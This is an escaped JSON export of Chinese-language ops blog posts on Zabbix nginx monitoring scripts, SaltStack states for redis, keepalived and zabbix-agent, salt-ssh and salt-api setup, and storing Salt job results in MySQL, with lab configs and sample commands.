&quot;http:&#x2F;&#x2F;127.0.0.1:&quot;$NGINX_PORT&quot;&#x2F;nginx_status&#x2F;&quot; 2&gt;&#x2F;dev&#x2F;null| grep &#39;Waiting&#39; | awk &#39;&#123;print $6&#125;&#39; &#125;nginx_accepts()&#123; &#x2F;usr&#x2F;bin&#x2F;curl &quot;http:&#x2F;&#x2F;127.0.0.1:&quot;$NGINX_PORT&quot;&#x2F;nginx_status&#x2F;&quot; 2&gt;&#x2F;dev&#x2F;null| awk NR&#x3D;&#x3D;3 | awk &#39;&#123;print $1&#125;&#39; &#125;nginx_handled()&#123; &#x2F;usr&#x2F;bin&#x2F;curl &quot;http:&#x2F;&#x2F;127.0.0.1:&quot;$NGINX_PORT&quot;&#x2F;nginx_status&#x2F;&quot; 2&gt;&#x2F;dev&#x2F;null| awk NR&#x3D;&#x3D;3 | awk &#39;&#123;print $2&#125;&#39; &#125;nginx_requests()&#123; &#x2F;usr&#x2F;bin&#x2F;curl &quot;http:&#x2F;&#x2F;127.0.0.1:&quot;$NGINX_PORT&quot;&#x2F;nginx_status&#x2F;&quot; 2&gt;&#x2F;dev&#x2F;null| awk NR&#x3D;&#x3D;3 | awk &#39;&#123;print $3&#125;&#39; &#125;main()&#123; case $2 in active) nginx_active; ;; reading) nginx_reading; ;; writing) nginx_writing; ;; waiting) nginx_waiting; ;; accepts) nginx_accepts; ;; handled) nginx_handled; ;; requests) nginx_requests; esac &#125;main $1 $2chmod 755 zabbix_nginx_plugin.sh chown -R zabbix.zabbix zabbix_nginx_plugin.sh自定义keyUserParameter&#x3D;nginx-status[*],&#x2F;etc&#x2F;zabbix&#x2F;zabbix_nginx_plugin.sh &quot;$1&quot; &quot;$2&quot; 12345678在zabbix server上,测试7个监控项的取值：zabbix_get -s 192.168.56.12 -k nginx-status[80,accepts]zabbix_get -s 192.168.56.12 -k nginx-status[80,handled]zabbix_get -s 192.168.56.12 -k nginx-status[80,reading]zabbix_get -s 192.168.56.12 -k nginx-status[80,requests]zabbix_get -s 192.168.56.12 -k nginx-status[80,waiting]zabbix_get -s 192.168.56.12 -k nginx-status[80,writing]zabbix_get -s 192.168.56.12 -k nginx-status[80,active] zabbix web上配置监控/图形/聚合图形等 12345678910111. 创建Ngin Status模板2. 创建应用集3. 创建监控项 名称：nginx_accepts 键值：nginx-status[80,accepts] #其他键值参考上面的脚本 应用集：选择刚刚创建的即可 启用：勾选4. 创建触发器5. 创建图形6. 创建聚合图形7. 创建幻灯片 PS:说说脚本中的黑洞/dev/null12345678910111213先聊聊数字：数字0表示标准输入－stdin数字1表示标准输出－stdout数字2表示标准错误－stderr回到黑洞：2&gt;&#x2F;dev&#x2F;null 把错误信息输出到黑洞(而此时正确的信息可以使用grep或awk命令提取)1&gt;&#x2F;dev&#x2F;null 把正确信息输出到黑洞&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 等同于&amp;&gt;&#x2F;dev&#x2F;null ,把正确信息和错误新一一起放到黑洞里范例：curl &quot;http:&#x2F;&#x2F;127.0.0.1:&quot;$NGINX_PORT&quot;&#x2F;nginx_status&#x2F;&quot; 2&gt;&#x2F;dev&#x2F;null| awk NR&#x3D;&#x3D;3 | awk &#39;&#123;print $2&#125;&#39;","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"zabbix","slug":"zabbix","permalink":"https://garywu520.github.io/tags/zabbix/"},{"name":"snmp","slug":"snmp","permalink":"https://garywu520.github.io/tags/snmp/"},{"name":"agent","slug":"agent","permalink":"https://garywu520.github.io/tags/agent/"},{"name":"自定义key监控","slug":"自定义key监控","permalink":"https://garywu520.github.io/tags/%E8%87%AA%E5%AE%9A%E4%B9%89key%E7%9B%91%E6%8E%A7/"},{"name":"图形乱码","slug":"图形乱码","permalink":"https://garywu520.github.io/tags/%E5%9B%BE%E5%BD%A2%E4%B9%B1%E7%A0%81/"}]},{"title":"saltstack安装redis","slug":"saltstack安装redis","date":"2017-10-25T09:09:51.000Z","updated":"2017-10-25T09:29:34.781Z","comments":true,"path":"2017/10/25/saltstack安装redis/","link":"","permalink":"https://garywu520.github.io/2017/10/25/saltstack%E5%AE%89%E8%A3%85redis/","excerpt":"目录结构 1234567891011├── modules│ ├── apache│ ├── haproxy│ ├── keepalived│ ├── mysql│ └── redis│ └── redis-install.sls└── redis-cluster ├── files │ └── redis-master.conf └── redis-master.sls","text":"目录结构 1234567891011├── modules│ ├── apache│ ├── haproxy│ ├── keepalived│ ├── mysql│ └── redis│ └── redis-install.sls└── redis-cluster ├── files │ └── redis-master.conf └── redis-master.sls redis-install.sls文件12345[root@linux-node1 redis]# cat redis-install.slsredis-install: pkg.installed: - name: redis redis-master.sls12345678910111213141516171819202122[root@linux-node1 redis-cluster]# cat redis-master.slsinclude: - modules.redis.redis-install #include加载redis安装slsredis-master-config: file.managed: - name: &#x2F;etc&#x2F;redis.conf - source: salt:&#x2F;&#x2F;redis-cluster&#x2F;files&#x2F;redis-master.conf - user: root - group: root - mode: 644 - template: jinja #启用jinja - defaluts: REDIS_MEM: 100mredis-master-service: service.running: - name: redis - enable: True - watch: - file: redis-master-config #如果redis配置变更则重启服务 12345678910在根环境的任意目录执行命令salt \\* state.sls redis-cluster.redis-master saltenv&#x3D;prod需要使用参数 saltenv&#x3D;prod 手动指定根环境因为saltstack是这样设计的，命令行指令运行，根目录是base(即配置文件指定的第一个目录)，所以需要使用参数 saltenv&#x3D;prod官方说明：If no saltenv is specified, the minion config will be checked for an environment parameter and if found, it will be used. If none is found, base will be used. In prior releases, the minion config was not checked and base would always be assumed when the saltenv was not explicitly set.","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"redis","slug":"redis","permalink":"https://garywu520.github.io/tags/redis/"},{"name":"saltstack","slug":"saltstack","permalink":"https://garywu520.github.io/tags/saltstack/"},{"name":"saltenv=prod","slug":"saltenv-prod","permalink":"https://garywu520.github.io/tags/saltenv-prod/"}]},{"title":"saltstack安装keepalived","slug":"saltstack安装keepalived","date":"2017-10-25T08:32:00.000Z","updated":"2017-10-25T09:29:31.907Z","comments":true,"path":"2017/10/25/saltstack安装keepalived/","link":"","permalink":"https://garywu520.github.io/2017/10/25/saltstack%E5%AE%89%E8%A3%85keepalived/","excerpt":"salt安装配置启动keepalived1根据keepalived.sls来配置 salt:&#x2F;&#x2F;cluster&#x2F;files&#x2F;haproxy-outside-keepalived.conf 目录下文件选项的调用配置","text":"salt安装配置启动keepalived1根据keepalived.sls来配置 salt:&#x2F;&#x2F;cluster&#x2F;files&#x2F;haproxy-outside-keepalived.conf 目录下文件选项的调用配置 keepalived.sls 123456789101112131415161718192021222324include: - keepalived.installkeepalived-server: file.managed: - name: &#x2F;etc&#x2F;keepalived&#x2F;keepalived.conf - source: salt:&#x2F;&#x2F;cluster&#x2F;files&#x2F;haproxy-outside-keepalived.conf - mode: 644 - user: root - group: root - template: jinja #开启jinja &#123;% if grains[&#39;fqdn&#39;] &#x3D;&#x3D; &#39;saltstack-node1.example.com&#39; %&#125; #主机名判断 - ROUTEID: haproxy_ha - STATEID: MASTER - PRIORITYID: 150 &#123;% elif grains[&#39;fqdn&#39;] &#x3D;&#x3D; &#39;saltstack-node2.example.com&#39; %&#125; #主机名判断 - ROUTEID: haproxy_ha - STATEID: BACKUP - PRIORITYID: 100 &#123;% endif %&#125; service.running: - name: keepalived - enable: True - watch: - file: keepalived-server #当source文件改变时，重启服务","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"keepalived","slug":"keepalived","permalink":"https://garywu520.github.io/tags/keepalived/"},{"name":"saltstack","slug":"saltstack","permalink":"https://garywu520.github.io/tags/saltstack/"},{"name":"salt主机名判断","slug":"salt主机名判断","permalink":"https://garywu520.github.io/tags/salt%E4%B8%BB%E6%9C%BA%E5%90%8D%E5%88%A4%E6%96%AD/"}]},{"title":"saltstack进阶学习5","slug":"saltstack进阶学习5","date":"2017-10-25T07:55:30.000Z","updated":"2017-10-25T08:29:45.514Z","comments":true,"path":"2017/10/25/saltstack进阶学习5/","link":"","permalink":"https://garywu520.github.io/2017/10/25/saltstack%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A05/","excerpt":"salt-ssh 使用12345salt是ssh串行处理安装yum install -y salt-sshsalt-ssh -h查看帮助","text":"salt-ssh 使用12345salt是ssh串行处理安装yum install -y salt-sshsalt-ssh -h查看帮助 12345678910111213cd &#x2F;etc&#x2F;salt &amp;&amp; cat roster #编辑花名册linux-node1.example.com: host: 192.168.56.11 user: root passwd: 123456 port: 22linux-node2: host: 192.168.56.12 user: root passwd: 123456 port: 22 12345salt-ssh \\* test.ping -i #首次执行salt-ssh \\* -r &#39;w&#39; #执行salt-ssh \\* state.sls web.lamp #salt执行状态文件roster文件可以使用脚本生成。 123456789101112如果花名册文件内不指定账号密码，执行会有如下结果：[root@linux-node1 salt]# salt-ssh \\* test.ping -iPermission denied for host linux-node2, do you want to deploy the salt-ssh key? (password required):[Y&#x2F;n] YPassword for root@linux-node2: linux-node2: TruePermission denied for host linux-node1.example.com, do you want to deploy the salt-ssh key? (password required):[Y&#x2F;n] YPassword for root@linux-node1.example.com: linux-node1.example.com: True 1salt-ssh实现方式，将内置Python脚本发送给客户端，然后在&#x2F;tmp下解压，运行后返回结果并删除&#x2F;tmp目录下的临时文件。传送前salt会验证脚本的语法正确性 制作salt-API接口123官网参考：https:&#x2F;&#x2F;www.unixhot.com&#x2F;docs&#x2F;saltstack&#x2F;ref&#x2F;netapi&#x2F;all&#x2F;salt.netapi.rest_cherrypy.html#a-rest-api-for-salt注：salt-api是基于HTTPS传输 123456789101112131415161718192021222324252627282930313233343536注：在saltstack服务器上面配置：yum install -y salt-api #安装rpm -qa |grep cherry #确认是否安装yum install -y pyOpenSSL #安装pyOpenSSLsalt-call --local tls.create_self_signed_cert #生成证书vim &#x2F;etc&#x2F;salt&#x2F;master #确认include参数default_include: master.d&#x2F;*.confmkdir -p &#x2F;etc&#x2F;salt&#x2F;master.d #创建include配置目录cd &#x2F;etc&#x2F;salt&#x2F;master.d vim api.conf #创建api配置文件并添加如下配置rest_cherrypy: host: 192.168.56.11 port: 8000 ssl_crt: &#x2F;etc&#x2F;pki&#x2F;tls&#x2F;certs&#x2F;localhost.crt ssl_key: &#x2F;etc&#x2F;pki&#x2F;tls&#x2F;certs&#x2F;localhost.key#配置认证用户useradd -M -s &#x2F;sbin&#x2F;nologin saltapi echo &quot;saltapi&quot; | passwd saltapi --stdin#配置认证auth文件cd &#x2F;etc&#x2F;salt&#x2F;master.dvim auth.conf external_auth: pam: saltapi: - .* - &#39;@wheel&#39; - &#39;@runner&#39; - &#39;@jobs&#39; systemctl restart salt-master #重启salt-mastersystemctl status salt-api #启动salt-api 1234567891011121314151617181920生成唯一Token(需牢记)curl -sSk https:&#x2F;&#x2F;192.168.56.11:8000&#x2F;login \\ -H &#39;Accept: application&#x2F;x-yaml&#39; \\ -d username&#x3D;&#39;saltapi&#39; \\ -d password&#x3D;&#39;saltapi&#39; \\ -d eauth&#x3D;&#39;pam&#39; ---------------------------------------------------输出：return:- eauth: pam expire: 1505755737.557594 perms: - .* - &#39;@wheel&#39; - &#39;@runner&#39; - &#39;@jobs&#39; start: 1505712537.557593 token: a808edd851aafa2b70202069af5bd5455c1281f4 user: saltapi 12345678910111213使用api执行test.ping指令：curl -sSk https:&#x2F;&#x2F;192.168.56.11:8000 \\ -H &#39;Accept: application&#x2F;x-yaml&#39; \\ -H &#39;X-Auth-Token: a808edd851aafa2b70202069af5bd5455c1281f4&#39;\\ -d client&#x3D;local \\ -d tgt&#x3D;&#39;*&#39; \\ -d fun&#x3D;test.ping ----------------------------------------------------------------------返回结果：return:- linux-node1.example.com: true linux-node2: true 1234使用salt-api执行命令的格式：curl -sSk https:&#x2F;&#x2F;192.168.56.11:8000&#x2F;minions&#x2F;linux-node1.example.com \\ -H &#39;Accept: application&#x2F;x-yaml&#39; \\ -H &#39;X-Auth-Token: a808edd851aafa2b70202069af5bd5455c1281f4&#39; 1234567891011121314151617使用salt-api来远程执行命令：执行命令指令,如uptime：curl -sSk https:&#x2F;&#x2F;192.168.56.11:8000 \\ -H &#39;Accept: application&#x2F;x-yaml&#39; \\ -H &#39;X-Auth-Token: a808edd851aafa2b70202069af5bd5455c1281f4&#39;\\ -d client&#x3D;local \\ -d tgt&#x3D;&#39;*&#39; \\ -d fun&#x3D;cmd.run \\ -d arg&#x3D;&#39;uptime&#39; ---------------------------------------------------------------------返回结果：return:- linux-node1.example.com: &#39; 01:42:34 up 1 day, 15:35, 3 users, load average: 0.04, 0.10, 0.10&#39; linux-node2: &#39; 10:01:36 up 1 day, 10:36, 2 users, load average: 0.01, 0.03, 0.05&#39; salt-master高可用1准备：2台服务器安装salt-master 1234567891011121314151617同步master配置1. 同步salt-master配置文件: &#x2F;etc&#x2F;salt&#x2F;master(确保file_roots配置一样) 2. 同步API公公钥和私钥：&#x2F;etc&#x2F;salt&#x2F;pki&#x2F;master&#x2F;3. 修改salt-minion配置文件（所有minion）vim &#x2F;etc&#x2F;salt&#x2F;minionmaster: - 192.168.56.11 - 192.168.56.12systemctl restart salt-minion 4. 同步salt-master状态文件 【rsync或NFS】5. 重启salt-master6. salt-key -A #在新master同意设置 此外，如果配置了salt返回值存储到mysql情况下，salt数据库与表也需要给新salt-master进行授权 注：后期，需要同时维护两个或多个salt-master使其一致。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"keepalived","slug":"keepalived","permalink":"https://garywu520.github.io/tags/keepalived/"},{"name":"saltstack","slug":"saltstack","permalink":"https://garywu520.github.io/tags/saltstack/"},{"name":"salt-master高可用","slug":"salt-master高可用","permalink":"https://garywu520.github.io/tags/salt-master%E9%AB%98%E5%8F%AF%E7%94%A8/"},{"name":"salt-API","slug":"salt-API","permalink":"https://garywu520.github.io/tags/salt-API/"},{"name":"salt-ssh","slug":"salt-ssh","permalink":"https://garywu520.github.io/tags/salt-ssh/"}]},{"title":"saltstack安装zabbix_agent","slug":"saltstack安装zabbix-agent","date":"2017-10-25T07:15:57.000Z","updated":"2017-10-25T07:50:54.219Z","comments":true,"path":"2017/10/25/saltstack安装zabbix-agent/","link":"","permalink":"https://garywu520.github.io/2017/10/25/saltstack%E5%AE%89%E8%A3%85zabbix-agent/","excerpt":"相关目录 123456789&#x2F;srv&#x2F;salt&#x2F;base├── init│ ├── files│ │ └── epel-7.repo│ └── yum-repo.sls└── zabbix ├── files │ └── zabbix_agentd.conf └── zabbix-agent.sls","text":"相关目录 123456789&#x2F;srv&#x2F;salt&#x2F;base├── init│ ├── files│ │ └── epel-7.repo│ └── yum-repo.sls└── zabbix ├── files │ └── zabbix_agentd.conf └── zabbix-agent.sls 12345epel-7.repo #阿里云CentOS 7 epel源yum-repo.sls #作用：安装epel源zabbix-agent.sls #安装zabbix agent的sls文件软件部署流程：安装、配置、启动 yum-repo.sls 123456&#x2F;etc&#x2F;yum.repos.d&#x2F;epel7.repo: file.managed: - source: salt:&#x2F;&#x2F;init&#x2F;files&#x2F;epel-7.repo - user: root - group: root - mode: 644 zabbix-agent.sls 以下步骤在编写时先命令执行一般，预防出错 12345678910111213141516171819202122232425262728293031323334353637include: - init.yum-repo zabbix-agent: pkg.installed: - name: zabbix22-agent - require: - file: &#x2F;etc&#x2F;yum.repos.d&#x2F;epel7.repo file.managed: - name: &#x2F;etc&#x2F;zabbix_agentd.conf - source: salt:&#x2F;&#x2F;zabbix&#x2F;files&#x2F;zabbix_agentd.conf - user: root - group: root - mode: 644 - template: jinja #启用jinja模板 - defaults: ZABBIX_SERVER: 192.168.56.11 AGENT_HOSTNAME: &#123;&#123; grains[&#39;fqdn&#39;] &#125;&#125; #grains获取本机hostname - require: - pkg: zabbix-agent service.running: - name: zabbix-agent - enable: True - watch: - file: zabbix-agent - pkg: zabbix-agentzabbix_agentd.conf.d: file.directory: - name: &#x2F;etc&#x2F;zabbix_agentd.conf.d - watch_in: #如果zabbix_agentd目录文件改变，触发zabbix-agent模块中的服务重启 - service: zabbix-agent - require: - pkg: zabbix-agent - file: zabbix-agent zabbix_agentd.conf 123修改base&#x2F;zabbix&#x2F;files&#x2F;zabbix_agentd.conf参数如下：Server&#x3D;&#123;&#123; ZABBIX_SERVER &#125;&#125;Hostname&#x3D;&#123;&#123; AGENT_HOSTNAME &#125;&#125; 执行 12salt \\* state.sls zabbix.zabbix-agent.sls test&#x3D;True -v #测试运行并显示jidsalt \\* state.sls zabbix.zabbix-agent.sls","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"saltstack","slug":"saltstack","permalink":"https://garywu520.github.io/tags/saltstack/"},{"name":"zabbix_agent","slug":"zabbix-agent","permalink":"https://garywu520.github.io/tags/zabbix-agent/"}]},{"title":"saltstack进阶学习4","slug":"saltstack进阶学习4","date":"2017-10-22T04:36:40.000Z","updated":"2017-10-25T09:02:36.920Z","comments":true,"path":"2017/10/22/saltstack进阶学习4/","link":"","permalink":"https://garywu520.github.io/2017/10/22/saltstack%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A04/","excerpt":"salt job123salt master每执行一个管理指令就被称为是一个salt job，每个salt job都会生成一个Jid(格式为%Y%m%d%H%M%S%f)。可以通过-v参数在执行命令时查看,如：salt \\* cmd.run &#39;uname -a&#39; -v test&#x3D;True","text":"salt job123salt master每执行一个管理指令就被称为是一个salt job，每个salt job都会生成一个Jid(格式为%Y%m%d%H%M%S%f)。可以通过-v参数在执行命令时查看,如：salt \\* cmd.run &#39;uname -a&#39; -v test&#x3D;True 123当minion接收到指令开始执行时，会在minion本地&#x2F;var&#x2F;cache&#x2F;salt&#x2F;minion目录下的proc目录产生该jid命名的文件。指令执行完毕，将结果传送给master后，删除该临时文件。而master收到该数据后会显示在用户终端，同时也会缓存在&#x2F;var&#x2F;cache&#x2F;salt&#x2F;master目录下jobs中。默认缓存24小时，由master主配置文件的keepjobs选项来决定 job常用管理–执行模块 1234567891011121314151617salt \\* -b 10 test.ping -b并发执行salt -S 192.168.56.0&#x2F;24 test.ping -S指定IP地址------------------------------------------------salt \\* network.active_tcp #查看活动的tcp连接salt \\* network.arp #查看minion arp信息salt \\* network.netstat #查看network 网络状态salt \\* network.connect qq.com 80 #域名访问salt \\* service.restart &lt;service name&gt; #重启某个服务salt \\* state.show_top #查看top文件salt \\* state.single pkg.installed name&#x3D;bind-utils #安装某个服务salt-run manage.status #输出哪些能连接哪些不能连接salt-run manage.versions #查看版本salt \\* cmd.run &#39;w&#39; test&#x3D;True #运行命令之前先测试参考：https:&#x2F;&#x2F;www.unixhot.com&#x2F;docs&#x2F;saltstack&#x2F;ref&#x2F;modules&#x2F;all&#x2F;salt.modules.service.html#module-salt.modules.service salt命令-v参数 123456789101112salt * cmd.run &#39;w&#39; -v-v命令会显示salt Job的JID, 例如：[root@linux-node1 ~]# salt \\* test.ping -vExecuting job with jid 20170917183029893196-------------------------------------------linux-node2: Truelinux-node1.example.com: True salt job返回值数据存储到mysql123刚才已经知道，minion默认返回值数据会保存在salt master的&#x2F;var&#x2F;cache&#x2F;salt&#x2F;master&#x2F;jobs目录中，如何将其存储到mysql数据库中呢？数据存储到mysql流程实质上是minion直接将数据返回到mysql，而不经过master 实现 12官方介绍：https:&#x2F;&#x2F;www.unixhot.com&#x2F;docs&#x2F;saltstack&#x2F;ref&#x2F;returners&#x2F;all&#x2F;salt.returners.mysql.html#module-salt.returners.mysql 12345678(1) 安装Python插件 yum install -y MySQL-python (2) 安装Mariadb yum install -y mariadb mariadb-server #安装mariadb systemctl start mariadb #启动服务 mysql_secure_installation #初始化数据库,创建密码。默认密码为空 mysql -uroot -p #创建数据库和表 复制如下命令在mysql中创建表 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950CREATE DATABASE &#96;salt&#96; DEFAULT CHARACTER SET utf8 DEFAULT COLLATE utf8_general_ci;USE &#96;salt&#96;;---- Table structure for table &#96;jids&#96;--DROP TABLE IF EXISTS &#96;jids&#96;;CREATE TABLE &#96;jids&#96; ( &#96;jid&#96; varchar(255) NOT NULL, &#96;load&#96; mediumtext NOT NULL, UNIQUE KEY &#96;jid&#96; (&#96;jid&#96;)) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8;CREATE INDEX jid ON jids(jid) USING BTREE;---- Table structure for table &#96;salt_returns&#96;--DROP TABLE IF EXISTS &#96;salt_returns&#96;;CREATE TABLE &#96;salt_returns&#96; ( &#96;fun&#96; varchar(50) NOT NULL, &#96;jid&#96; varchar(255) NOT NULL, &#96;return&#96; mediumtext NOT NULL, &#96;id&#96; varchar(255) NOT NULL, &#96;success&#96; varchar(10) NOT NULL, &#96;full_ret&#96; mediumtext NOT NULL, &#96;alter_time&#96; TIMESTAMP DEFAULT CURRENT_TIMESTAMP, KEY &#96;id&#96; (&#96;id&#96;), KEY &#96;jid&#96; (&#96;jid&#96;), KEY &#96;fun&#96; (&#96;fun&#96;)) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8;---- Table structure for table &#96;salt_events&#96;--DROP TABLE IF EXISTS &#96;salt_events&#96;;CREATE TABLE &#96;salt_events&#96; (&#96;id&#96; BIGINT NOT NULL AUTO_INCREMENT,&#96;tag&#96; varchar(255) NOT NULL,&#96;data&#96; mediumtext NOT NULL,&#96;alter_time&#96; TIMESTAMP DEFAULT CURRENT_TIMESTAMP,&#96;master_id&#96; varchar(255) NOT NULL,PRIMARY KEY (&#96;id&#96;),KEY &#96;tag&#96; (&#96;tag&#96;)) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8; 12345给salt数据库赋权grant all on salt.* to salt@192.168.56.11 identified by &#39;salt&#39;;测试salt数据库-连接mysql -h 192.168.56.11 -u salt -p 12345678910111213141516171819202122(3) 配置master 编辑&#x2F;etc&#x2F;salt&#x2F;master,添加如下内容： master_job_cache: mysql mysql.host: &#39;192.168.56.11&#39; mysql.user: &#39;salt&#39; mysql.pass: &#39;salt&#39; mysql.db: &#39;salt&#39; (4) 重启master systemctl restart salt-master (5) 测试job数据写入mysql mysql -h 192.168.56.11 -u salt -p MariaDB &gt; show databases; MariaDB [salt]&gt; use salt; MariaDB [salt]&gt; select * from salt_returns\\G #第一次没有结果 新开一个窗口执行命令：salt \\* test.ping -v 再次查看表内容，已经看到已经有内容了,结果类似如下： MariaDB [salt]&gt; select * from salt_returns\\G 1234567891011............*************************** 74. row *************************** fun: mine.update jid: 20170917210633960983 return: true id: linux-node1.example.com success: 0 full_ret: &#123;&quot;tgt_type&quot;: &quot;glob&quot;, &quot;jid&quot;: &quot;20170917210633960983&quot;, &quot;return&quot;: true, &quot;tgt&quot;: &quot;linux-node1.example.com&quot;, &quot;schedule&quot;: &quot;__mine_interval&quot;, &quot;cmd&quot;: &quot;_return&quot;, &quot;pid&quot;: 29777, &quot;_stamp&quot;: &quot;2017-09-18T01:06:33.964175&quot;, &quot;arg&quot;: [], &quot;fun&quot;: &quot;mine.update&quot;, &quot;id&quot;: &quot;linux-node1.example.com&quot;&#125;alter_time: 2017-09-17 21:06:3374 rows in set (0.00 sec) 状态关系之include用法源lamp.sls文件内容如下： 123456789101112131415161718192021lamp-install: pkg.installed: - pkgs: - httpd - php - php-pdo - php-mysqlapache-config: file.managed: - name: &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf - source: salt:&#x2F;&#x2F;web&#x2F;files&#x2F;httpd.conf - user: root - group: root - mode: 644 - template: jinja - defaults: PORT: 80 IPADDR: &#123;&#123; grains[&#39;fqdn_ip4&#39;][0] &#125;&#125; - require: - pkg: lamp-install 把httpd安装部分摘出来存放到 base/web/httpd.sls 1234567lamp-install: pkg.installed: - pkgs: - httpd - php - php-pdo - php-mysql 修改刚才看到的lamp.sls文件 引用刚才创建的httpd.sls 12345678910111213141516include: - web.httpdapache-config: file.managed: - name: &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf - source: salt:&#x2F;&#x2F;web&#x2F;files&#x2F;httpd.conf - user: root - group: root - mode: 644 - template: jinja - defaults: PORT: 80 IPADDR: &#123;&#123; grains[&#39;fqdn_ip4&#39;][0] &#125;&#125; - require: - pkg: lamp-install minion_id如何修改1234567正确流程：1. 停止minion服务2. salt-key -d minionid 删除minion3. rm -f &#x2F;etc&#x2F;salt&#x2F;minion_id4. rm -rf &#x2F;etc&#x2F;salt&#x2F;pki5. 修改配置文件id:6. 启动minion salt本地管理（无master架构）1234567891011salt支持单机使用(即没有master)(1)vim &#x2F;etc&#x2F;salt&#x2F;minion #file_client: remote #修改该行。默认远程，取消注释并改为local 再配置file_roots(2)systemctl stop minion #停止服务，不需要启动了(3)配置状态执行sls文件(4)salt-call --local state.sls web.tomcat #执行命令使用场景：本机弱网络或快速部署服务时需要使用，比如：快速在本机部署cobbler服务","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"mysql","slug":"mysql","permalink":"https://garywu520.github.io/tags/mysql/"},{"name":"saltstack","slug":"saltstack","permalink":"https://garywu520.github.io/tags/saltstack/"},{"name":"mariadb","slug":"mariadb","permalink":"https://garywu520.github.io/tags/mariadb/"},{"name":"salt本地管理","slug":"salt本地管理","permalink":"https://garywu520.github.io/tags/salt%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86/"},{"name":"无master架构","slug":"无master架构","permalink":"https://garywu520.github.io/tags/%E6%97%A0master%E6%9E%B6%E6%9E%84/"},{"name":"include","slug":"include","permalink":"https://garywu520.github.io/tags/include/"},{"name":"salt job","slug":"salt-job","permalink":"https://garywu520.github.io/tags/salt-job/"},{"name":"cache mariadb","slug":"cache-mariadb","permalink":"https://garywu520.github.io/tags/cache-mariadb/"},{"name":"salt-run","slug":"salt-run","permalink":"https://garywu520.github.io/tags/salt-run/"},{"name":"minion_id","slug":"minion-id","permalink":"https://garywu520.github.io/tags/minion-id/"}]},{"title":"zabbix-精讲","slug":"zabbix-精讲","date":"2017-10-21T01:48:42.000Z","updated":"2017-10-29T06:15:42.715Z","comments":true,"path":"2017/10/21/zabbix-精讲/","link":"","permalink":"https://garywu520.github.io/2017/10/21/zabbix-%E7%B2%BE%E8%AE%B2/","excerpt":"量化-网站可用性 1所谓网站可用性即网站正常运行时间的百分比，业界用N个9来量化可用性，最长说的就是类似4个9（也就是99.99%）的可用性","text":"量化-网站可用性 1所谓网站可用性即网站正常运行时间的百分比，业界用N个9来量化可用性，最长说的就是类似4个9（也就是99.99%）的可用性 CPU命令 1234567lscpu #查看cpu核数等信息uptime #查看系统负载、时间等, 查看帮助 man uptimetop #实时查看系统负载，以CPU数值排列的【top界面z加颜色，按x显示当前以什么排列，大于号&gt;以资源高的排列，小于号&lt;撤销htop】w 命令主要用来查看系统已登录的用户 内存命令 1free -m 或 free -h 磁盘命令 12df -h #查看磁盘剩余iotop #实时查看磁盘io ; yum install -y iotop 网络命令 12345yum -y install iftop nethogsiftop #查看主机流量iftop -i eth1 #只查看某个网卡流量nethogs #查看哪个进程占用带宽多 zabbix 官网：www.zabbix.com 1zabbix组件构成：zabbix server（服务端） 、zabbix agent(客户端)和zabbix proxy(实现分布式监控) 安装部署123官方中文文档：https:&#x2F;&#x2F;www.zabbix.com&#x2F;documentation&#x2F;3.4&#x2F;zh&#x2F;manual 本实例以CentOS7安装zabbix3.2为例 zabbix使用 添加主机 配置 –&gt; 主机 –&gt; 添加主机 1234主机名称：需要与主机名称相同可见的名称：显示在zabbix上的名称IP地址：服务器物理对应网卡IP地址，端口:10050启用 ---&gt; 更新 图形 123最新数据 -- 图形 -- 筛选主机固定的与动态的: “动态的”表示会局部自动刷新图形的时间若不正确，需要更新zabbix_server的本地时间 zabbix相关命令 12341. 修改zabbix_agent配置文件中的server项，允许zabbix server获取数据2. zabbix主动获取客户端数据-测试zabbix_get -s 172.16.1.8 -p 10050 -k &quot;system.cpu.load[all,avg1]&quot; 自定义命令/脚本监控12345678910111213(1) 修改指定zabbix_agent主配置文件，检查是否有Include参数(2) 修改zabbix_agent主配置文件把客户端的key告诉zabbix server： 格式：UserParameter&#x3D;&lt;key&gt;,&lt;shell command&gt; echo &quot;UserParameter&#x3D;login-user,who|wc -l&quot; &gt;&gt;&#x2F;etc&#x2F;zabbix&#x2F;zabbix_agentd.d&#x2F;userparameter_login.conf &#x2F;etc&#x2F;init.d&#x2F;zabbix-agent restart (3) zabbix_server检查key值 zabbix_get -s 172.16.1.8 -p 10050 -k &quot;login-user&quot; 注：如果shell命令较多，可以存放文件里，然后通过sh执行 如：UserParameter&#x3D;login-user,&#x2F;bin&#x2F;sh &#x2F;var&#x2F;scripts&#x2F;login-user.sh 12345678910111213141516171819202122232425262728293031(4) zabbix Web添加自定义的监控项 4.1 添加模板：配置--&gt; 模板 --&gt;创建模板 模板名称：Template login_user 群组：选择或新建一个群组 4.2 找到&#x2F;点击刚创建的Template login_user 应用集：创建应用集 -- 名称:安全 监控项：创建监控项 -- 名称：登陆用户数量 -- 键值输入：login-user 数据更新间隔：300秒 -- 历史数据保留时长 - 趋势数据存储周期 新的应用集:选择创建好的&quot;安全&quot; -- 启用 